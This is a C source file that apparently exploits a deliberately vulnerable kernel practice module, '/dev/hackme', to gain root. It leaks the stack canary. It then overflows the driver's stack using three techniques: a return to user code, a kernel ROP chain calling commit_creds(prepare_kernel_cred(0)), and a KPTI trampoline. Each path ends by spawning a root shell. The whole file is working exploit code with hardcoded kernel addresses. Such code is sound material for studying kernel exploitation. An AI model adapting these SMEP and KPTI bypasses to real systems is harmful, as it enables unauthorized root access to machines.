#include <fcntl.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

uint64_t commit_cred_addr = 0xffffffff814c6410;
uint64_t prepare_kernel_cred_addr = 0xffffffff814c67f0;
uint64_t swapgs_restore_regs_and_return_to_usermode_addr = 0xffffffff81200f10;

int hackme_fd;
uint64_t cookie, user_cs, user_rflags, user_sp, user_ss;

void open_dev(void) {
    hackme_fd = open("/dev/hackme", O_RDWR);
    if (hackme_fd < 0) {
        puts("[!] Failed to open device");
        exit(EXIT_FAILURE);
    } else {
        puts("[*] Opened /dev/hackme");
    }
}

void _hackme_read(void *buf, size_t sz) {
    ssize_t nb = read(hackme_fd, buf, sz);
    if (nb < 0) {
        puts("[!] Failed to read");
        exit(EXIT_FAILURE);
    }
    printf("[*] Leaked %zd bytes\n", nb);
}

void _hackme_write(void *buf, size_t sz) {
    ssize_t nb = write(hackme_fd, buf, sz);
    if (nb < 0) {
        puts("[!] Failed to write");
        exit(EXIT_FAILURE);
    }
}

void spawn_shell() {
    puts("[*] Returning to userland");
    uid_t uid = geteuid();
    if (uid > 0) {
        printf("[!] Incorrect euid = %d\n", uid);
        exit(EXIT_FAILURE);
    }
    puts("[*] Spawning shell as root user");
    system("/bin/sh");
}

void save_user_state() {
    __asm__(".intel_syntax noprefix;"
            "mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            ".att_syntax;");
    puts("[*] user state saved");
}

uint64_t user_rip = (uint64_t)spawn_shell;

void privesc() {
    __asm__(".intel_syntax noprefix;"
            "xor rdi, rdi;"
            "movabs rax, prepare_kernel_cred_addr;"
            "call rax;"
            "mov rdi, rax;"
            "movabs rax, commit_cred_addr;"
            "call rax;"
            "swapgs;"
            "mov r15, user_ss;"
            "push r15;"
            "mov r15, user_sp;"
            "push r15;"
            "mov r15, user_rflags;"
            "push r15;"
            "mov r15, user_cs;"
            "push r15;"
            "mov r15, user_rip;"
            "push r15;"
            "iretq;"
            ".att_syntax;");
}

void no_smep() {
    /*
     * With SMEP enabled, this exploit does not work since it uses userland code
     * to invoke commit_cred(prepare_kernel_cred(0))
     */
    uint64_t payload[0x20];
    // tmp is [rbp-98h], canary is [rbp-18h]
    size_t cookie_idx = (0xa0 - 0x20) / 8;
    payload[cookie_idx++] = cookie;
    payload[cookie_idx++] = 0;
    payload[cookie_idx++] = 0;
    payload[cookie_idx++] = 0;                 // saved rbp
    payload[cookie_idx++] = (uint64_t)privesc; // saved rip

    puts("[*] Sending payload");
    _hackme_write(payload, sizeof(payload));
    puts("[*] Payload sent");
}

void kernel_rop() {
    /*
     * Unlike the no_smep() exploit, this time
     * commit_cred(prepare_kernel_cred(0)) is executed with a ROP chain inside
     * kernel space which does not violate SMEP
     */
    uint64_t pop_rdi = 0xffffffff81006370;    // pop_rdi; ret;
    uint64_t swapgs_pop = 0xffffffff8146d4e4; // swapgs; pop rbp; ret;
    uint64_t iretq = 0xffffffff8100c0d9;      // iretq;

    // 0xffffffff816bf203: mov rdi, rax; mov [rsi+0x140], rdi; pop rbp; ret;
    uint64_t mov_rdi_rax = 0xffffffff816bf203;

    // payload[0x40] caused stack guard page hit BUG
    uint64_t payload[0x30];
    size_t cookie_idx = (0xa0 - 0x20) / 8;
    payload[cookie_idx++] = cookie;
    payload[cookie_idx++] = 0;
    payload[cookie_idx++] = 0;
    payload[cookie_idx++] = 0;       // saved rbp
    payload[cookie_idx++] = pop_rdi; // saved rip
    payload[cookie_idx++] = 0;
    payload[cookie_idx++] = prepare_kernel_cred_addr;
    payload[cookie_idx++] = mov_rdi_rax;
    payload[cookie_idx++] = 0;
    payload[cookie_idx++] = commit_cred_addr;
    payload[cookie_idx++] = swapgs_pop;
    payload[cookie_idx++] = 0;
    payload[cookie_idx++] = iretq;
    payload[cookie_idx++] = (uint64_t)spawn_shell; // user rip
    payload[cookie_idx++] = user_cs;
    payload[cookie_idx++] = user_rflags;
    payload[cookie_idx++] = user_sp;
    payload[cookie_idx++] = user_ss;

    puts("[*] Sending payload");
    _hackme_write(payload, sizeof(payload));
    puts("[*] Payload sent");
}

void kpti_trampoline() {
    uint64_t pop_rdi = 0xffffffff81006370;    // pop_rdi; ret;
    uint64_t swapgs_pop = 0xffffffff8146d4e4; // swapgs; pop rbp; ret;
    uint64_t iretq = 0xffffffff8100c0d9;      // iretq;

    // 0xffffffff816bf203: mov rdi, rax; mov [rsi+0x140], rdi; pop rbp; ret;
    uint64_t mov_rdi_rax = 0xffffffff816bf203;

    // payload[0x40] caused stack guard page hit BUG
    uint64_t payload[0x30];
    size_t cookie_idx = (0xa0 - 0x20) / 8;
    payload[cookie_idx++] = cookie;
    payload[cookie_idx++] = 0;
    payload[cookie_idx++] = 0;
    payload[cookie_idx++] = 0;       // saved rbp
    payload[cookie_idx++] = pop_rdi; // saved rip
    payload[cookie_idx++] = 0;
    payload[cookie_idx++] = prepare_kernel_cred_addr;
    payload[cookie_idx++] = mov_rdi_rax;
    payload[cookie_idx++] = 0;
    payload[cookie_idx++] = commit_cred_addr;
    payload[cookie_idx++] =
        swapgs_restore_regs_and_return_to_usermode_addr + 22;
    payload[cookie_idx++] = 0;
    payload[cookie_idx++] = 0;
    payload[cookie_idx++] = (uint64_t)spawn_shell; // user rip
    payload[cookie_idx++] = user_cs;
    payload[cookie_idx++] = user_rflags;
    payload[cookie_idx++] = user_sp;
    payload[cookie_idx++] = user_ss;

    puts("[*] Sending payload");
    _hackme_write(payload, sizeof(payload));
    puts("[*] Payload sent");
}

int main(void) {
    /*
     * KPTI caused SIGSEGV on user mode not kernel
     */
    // signal(SIGSEGV, spawn_shell);
    save_user_state();

    open_dev();
    uint64_t leak[32];
    _hackme_read(leak, sizeof(leak));
    cookie = leak[16];
    printf("[*] Cookie: %lx\n", cookie);

    kpti_trampoline();
    return 0;
}
